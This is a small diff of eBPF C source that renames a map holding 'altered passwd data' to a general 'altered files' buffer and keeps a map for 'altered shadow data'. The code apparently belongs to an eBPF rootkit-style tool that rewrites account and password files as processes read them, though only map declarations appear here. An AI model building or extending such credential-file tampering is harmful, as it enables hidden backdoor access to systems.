@@ -31,18 +31,18 @@ struct {
 } auth_elem SEC(".maps");
 
 /*
-    altered passwd data
+    altered files
 */
-struct passwd_block {
+struct file_block {
     char buff[8192];
     int buff_len;
 };
 struct {
     __uint(type, BPF_MAP_TYPE_HASH);
-    __uint(max_entries, 1);
+    __uint(max_entries, 2);
     __type(key, int); // 0
-    __type(value, struct passwd_block);
-} passwd_elem SEC(".maps");
+    __type(value, struct file_block);
+} files_elem SEC(".maps");
 /*
     altered shadow data
 */
